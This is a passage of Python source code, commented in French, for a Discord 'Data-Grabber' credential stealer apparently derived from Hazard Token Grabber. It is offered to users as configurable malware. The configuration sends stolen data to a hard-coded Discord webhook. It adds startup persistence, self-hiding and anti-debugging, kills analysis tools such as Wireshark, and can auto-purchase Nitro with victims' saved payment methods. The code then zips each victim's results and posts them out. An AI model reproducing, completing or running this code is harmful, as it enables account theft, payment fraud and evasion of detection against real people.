# Essaye d'importer les modules, s'il en manque, il sera demandé de les installer ci-dessous.
try:
    import os
    import json
    import httpx
    ...
    import time
    import os
    input("Modules manquants trouvés. Appuyez sur Entrée pour les installer.")
    print("Modules manquants trouvés. Appuyez sur Entrée pour les installer.")
    time.sleep(3.0)
    ...
    os.system("cls")
    print("Modules manquants installés avec succès. Veuillez redémarrer le client. Fermeture de ce terminal dans 10 secondes.")
    time.sleep(10)
    sys.exit

config = {
     # Remplacez WEBHOOK_URL par votre propre webhook. Les données collectées seront envoyées à ce webhook. 
    'webhook': "https://discord.com/api/webhooks/1265631003209109605/dzvwgrew8Z4tbU6GALf02aUCowIoXP4AMJB8Me9pY-tb34qd_eSXIryPUWf0_tuRigkv",
    
    # Réglez sur False si vous ne souhaitez pas tuer des programmes tels que discord lors de l'exécution de l'exe.
    'kill_processes': False,
    
    # Cela fait en sorte que le programme exécute le fichier après chaque démarrage.
    'startup': True,
    
    # Cette fonctionnalité fera en sorte que le fichier se cache après avoir été ouvert.
    'hide_self': True,
    
    # Le programme fait de son mieux pour empêcher le débogage du programme et réduit considérablement les chances de trouver votre webhook.
    'anti_debug': True,
    
    # Si injecté avec succès dans Discord, le programme essaiera automatiquement d'acheter Discord Nitro avec des cartes de crédit/PayPal/autres paiements et de l'envoyer à votre webhook.
    'auto_buy_nitro': True,
    
    # Cette liste de programmes sera arrêtée si Data-Grabber détecte que l'un de ces programmes est en cours d'exécution, vous pouvez en ajouter d'autres ou en supprimer si vous le souhaitez.
    'blackListedPrograms':
    [
        "httpdebuggerui",
        "wireshark",
...
class functions(object):
    ...
    @staticmethod
    def fetchConf(e: str) -> str or bool | None: # type: ignore
        return config.get(e)
...
class Data_Grabber(functions):
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "👽・Grabber By TenmaWeb x KatexWeb")
        ...
        _zipfile = os.path.join(
            self.appdata, f'Résultats-[{Victim}].zip')
        ...
        embed = {
            'username'
            'avatar_url': 'https://is1-ssl.mzstatic.com/image/thumb/Music126/v4/68/3f/35/683f359d-3521-ce5d-02cb-8b84602fe17e/artwork.jpg/600x600bb.jpg',
            'embeds': [
                {
                    'author': {
                        'name': f'{Victim} Vient de lancer Data-Grabber',
                        'url': 'https://github.com/S1LKT0UCH/Hazard-Token-Grabber-v2',
                        'icon_url': 'https://yt3.googleusercontent.com/lqm95Ojgc8f5K3ZdQA_qZmdFojoLKVL1MRe-pBeZzf_X9qLEe9nFdSysnDEo_E36XjSfs7Ts=s160-c-k-c0x00ffffff-no-rj'
                    },
                    'color': 16119101,
                    ...
                    'footer': {
                        'text': '👽・Grabber By TenmaWeb x KatexWeb'
                    }
                }
            ]
        }
